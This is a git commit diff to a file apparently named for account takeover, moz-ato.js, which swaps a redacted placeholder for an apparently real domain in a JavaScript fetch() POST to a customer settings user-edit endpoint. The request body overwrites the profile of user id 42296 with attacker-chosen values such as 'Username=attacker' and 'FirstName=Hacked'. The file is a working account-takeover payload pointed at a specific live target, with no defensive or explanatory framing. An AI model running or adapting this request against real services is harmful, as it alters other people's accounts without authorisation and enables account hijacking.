2b238ee3dd43587d427e2b0a184a937b9a97649f
tomoncrss <tonymyson89823@gmail.com>
2025-03-10 22:25:42 +0330

    Update moz-ato.js

--- moz-ato.js
+++ moz-ato.js
@@ -1,4 +1,4 @@
-fetch('https://redacted.com/customer/settings/user-edit/update', {
+fetch('https://hijd.mozeo.com/customer/settings/user-edit/update', {
   method: 'POST',
   headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
   body: 'Username=attacker&FirstName=Hacked&LastName=User&Phonenumber=1234567890&id=42296'
